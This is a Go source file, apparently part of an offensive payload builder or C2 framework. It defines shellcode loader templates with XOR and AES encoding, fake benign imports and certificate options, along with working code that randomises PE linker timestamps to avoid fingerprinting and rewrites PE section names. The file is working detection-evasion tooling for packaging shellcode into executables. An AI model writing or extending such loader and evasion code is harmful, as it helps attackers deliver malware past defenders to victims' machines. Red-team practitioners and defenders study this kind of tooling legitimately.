package payload

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math/big"
	"strings"
	"time"
)

type PESectionConfig struct {
	Text  string `json:"text"`
	Data  string `json:"data"`
	Rdata string `json:"rdata"`
	Reloc string `json:"reloc"`
}

type EntryPointTechnique string

const (
	EPDirect   EntryPointTechnique = "direct"
	EPCall     EntryPointTechnique = "call"
	EPCallback EntryPointTechnique = "callback"
	EPTLS      EntryPointTechnique = "tls"
)

type TimestampOption string

const (
	TSRandom TimestampOption = "random"
	TSKeep   TimestampOption = "keep"
	TSCustom TimestampOption = "custom"
)

type CertOption string

const (
	CertNone       CertOption = "none"
	CertSelfSigned CertOption = "self_signed"
	CertCustom     CertOption = "custom"
)

type ShellcodeEncode string

const (
	EncodeNone ShellcodeEncode = "none"
	EncodeXOR  ShellcodeEncode = "xor"
	EncodeAES  ShellcodeEncode = "aes"
	EncodeSGN  ShellcodeEncode = "sgn"
)

type ArtifactTemplate struct {
	Name                string              `json:"name"`
	Description         string              `json:"description"`
	OutputType          string              `json:"output_type"`
	PESections          PESectionConfig     `json:"pe_sections"`
	EntryPointTechnique EntryPointTechnique `json:"entry_point_technique"`
	Timestamp           TimestampOption     `json:"timestamp"`
	TimestampValue      string              `json:"timestamp_value"`
	CertOption          CertOption          `json:"cert_option"`
	CertOrg             string              `json:"cert_org"`
	ImportManipulation  bool                `json:"import_manipulation"`
	BenignImports       []string            `json:"benign_imports"`
	EmbedResources      bool                `json:"embed_resources"`
	ShellcodeEncode     ShellcodeEncode     `json:"shellcode_encode"`
	EncodeKey           string              `json:"encode_key"`
}

type ArtifactConfig struct {
	TargetType     string            `json:"target_type"`
	Template       ArtifactTemplate  `json:"template"`
	Shellcode      []byte            `json:"-"`
	OutputPath     string            `json:"output_path"`
	CustomSections []PESectionConfig `json:"custom_sections"`
	ImportDLLs     []string          `json:"import_dlls"`
}

func DefaultPESections() PESectionConfig {
	return PESectionConfig{
		Text:  ".text",
		Data:  ".data",
		Rdata: ".rdata",
		Reloc: ".reloc",
	}
}

func DefaultArtifactTemplate(name string) ArtifactTemplate {
	return ArtifactTemplate{
		Name:                name,
		Description:         fmt.Sprintf("%s artifact template", name),
		OutputType:          "exe",
		PESections:          DefaultPESections(),
		EntryPointTechnique: EPDirect,
		Timestamp:           TSRandom,
		CertOption:          CertNone,
		ImportManipulation:  false,
		BenignImports:       []string{},
		EmbedResources:      false,
		ShellcodeEncode:     EncodeNone,
	}
}

// BuiltinTemplates lists the packer templates the UI can apply. Every option
// advertised here must be fully implemented by BuildArtifact: the loaders
// produce real executables/scripts, self_signed embeds a real Authenticode
// table, and DLL generation (toolchain-dependent) is deliberately absent.
func BuiltinTemplates() []ArtifactTemplate {
	return []ArtifactTemplate{
		{
			Name:                "default_exe",
			Description:         "Standard EXE loader with default PE sections and direct entry point",
			OutputType:          "exe",
			PESections:          DefaultPESections(),
			EntryPointTechnique: EPDirect,
			Timestamp:           TSRandom,
			CertOption:          CertNone,
			ImportManipulation:  false,
			ShellcodeEncode:     EncodeNone,
		},
		{
			Name:                "xor_loader",
			Description:         "EXE loader embedding XOR-encoded shellcode",
			OutputType:          "exe",
			PESections:          DefaultPESections(),
			EntryPointTechnique: EPDirect,
			Timestamp:           TSRandom,
			CertOption:          CertNone,
			ImportManipulation:  true,
			BenignImports:       []string{"kernel32.dll", "user32.dll"},
			ShellcodeEncode:     EncodeXOR,
		},
		{
			Name:                "aes_loader",
			Description:         "EXE loader embedding AES-CTR-encrypted shellcode",
			OutputType:          "exe",
			PESections:          DefaultPESections(),
			EntryPointTechnique: EPDirect,
			Timestamp:           TSRandom,
			CertOption:          CertNone,
			ImportManipulation:  true,
			BenignImports:       []string{"kernel32.dll", "bcrypt.dll"},
			ShellcodeEncode:     EncodeAES,
		},
	}
}

func GenerateTimestamp(opt TimestampOption, custom string) (uint32, error) {
	switch opt {
	case TSRandom:
		// Linker timestamps are build times, not arbitrary 32-bit values. A
		// value in the future (the old 2019..2100 range) or one older than
		// this ecosystem is an obvious fingerprint, so pick a plausible past
		// day and leave a small margin for timezone/clock skew.
		const floor = int64(1546300800) // 2019-01-01T00:00:00Z
		ceiling := time.Now().Add(-24 * time.Hour).Unix()
		if ceiling <= floor {
			return uint32(floor), nil
		}
		n, err := rand.Int(rand.Reader, big.NewInt(ceiling-floor+1))
		if err != nil {
			return 0, err
		}
		return uint32(floor + n.Int64()), nil
	case TSKeep:
		return 0, nil
	case TSCustom:
		t, err := time.Parse("2006-01-02", custom)
		if err != nil {
			return 0, fmt.Errorf("invalid timestamp format (use YYYY-MM-DD): %w", err)
		}
		return uint32(t.Unix()), nil
	default:
		return 0, nil
	}
}

func ApplyTimestamp(data []byte, ts uint32) {
	if ts == 0 || len(data) < 0x80 {
		return
	}
	if data[0] != 'M' || data[1] != 'Z' {
		return
	}
	peOffset := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
	tsOffset := peOffset + 8
	if tsOffset+4 <= len(data) {
		binary.LittleEndian.PutUint32(data[tsOffset:], ts)
	}
}

// ApplyPESectionNames rewrites the section header names of a PE image. It
// matches sections by their resolved name (.text, .data, .rdata, .reloc)
// rather than by table index: the Go linker does not emit every section in
// every binary, and a hardcoded index would rename .pdata or .tls instead.
// The section table starts after the optional header, whose size must be read
// from IMAGE_FILE_HEADER (a hardcoded offset silently fails on PE32+ images).
func ApplyPESectionNames(data []byte, sections PESectionConfig) {
	if len(data) < 0x100 || data[0] != 'M' || data[1] != 'Z' {
		return
	}
	peOffset := int(binary.LittleEndian.Uint32(data[0x3C:0x40]))
	if peOffset+24 >= len(data) {
		return
	}
	if data[peOffset] != 'P' || data[peOffset+1] != 'E' {
		return
	}
	numSections := int(binary.LittleEndian.Uint16(data[peOffset+6 : peOffset+8]))
	if numSections <= 0 || numSections > 96 {
		return
	}
	sizeOptHeader := int(binary.LittleEndian.Uint16(data[peOffset+20 : peOffset+22]))
	if sizeOptHeader == 0 {
		return
	}
	sectionOffset := peOffset + 4 + 20 + sizeOptHeader
	if sectionOffset+40*numSections > len(data) {
		return
	}
	byName := map[string]string{
		".text":  sections.Text,
		".data":  sections.Data,
		".rdata": sections.Rdata,
		".reloc": sections.Reloc,
	}
	for i := 0; i < numSections; i++ {
		off := sectionOffset + i*40
		resolved := peSectionName(data, peOffset, off)
		name, ok := byName[strings.ToLower(resolved)]
		if !ok || name == "" {
			continue
		}
		b := make([]byte, 8)
		copy(b, name)
		copy(data[off:off+8], b)
		// Only the first section of a given name is renamed; duplicate
		// .text/.data sections are unusual but must not all collapse to the
		// same configured name.
		delete(byName, strings.ToLower(resolved))
	}
}

// peSectionName resolves a section header name, following the COFF long-name
// convention (/nnn -> offset into the string table after the symbol table).
// The Go linker and garble both emit long names this way when they randomize
// sections, so reading only the 8-byte field would defeat name-based matching.
func peSectionName(data []byte, peOffset, hdrOff int) string {
	raw := data[hdrOff : hdrOff+8]
	if raw[0] != '/' {
		return strings.TrimRight(string(raw), "\x00 ")
	}
	n := 0
	digits := 0
	for i := 1; i < 8; i++ {
		if raw[i] < '0' || raw[i] > '9' {
			break
		}
		n = n*10 + int(raw[i]-'0')
		digits++
	}
	if digits == 0 {
		return strings.TrimRight(string(raw), "\x00 ")
	}
	symPtr := int(binary.LittleEndian.Uint32(data[peOffset+12 : peOffset+16]))
	numSym := int(binary.LittleEndian.Uint32(data[peOffset+16 : peOffset+20]))
	if symPtr <= 0 || symPtr > len(data) {
		return strings.TrimRight(string(raw), "\x00 ")
	}
	strOff := symPtr + 18*numSym
	if strOff < symPtr || strOff+4 > len(data) {
		return strings.TrimRight(string(raw), "\x00 ")
	}
	strSize := int(binary.LittleEndian.Uint32(data[strOff : strOff+4]))
	if strSize < 4 || strOff+strSize > len(data) || n < 4 || n >= strSize {
		return strings.TrimRight(string(raw), "\x00 ")
	}
	start := strOff + n
	end := strOff + strSize
	if start >= end {
		return strings.TrimRight(string(raw), "\x00 ")
	}
	b := data[start:end]
	if i := bytes.IndexByte(b, 0); i >= 0 {
		b = b[:i]
	}
	return string(b)
}

// (AddBenignImports lives in artifact_imports.go)
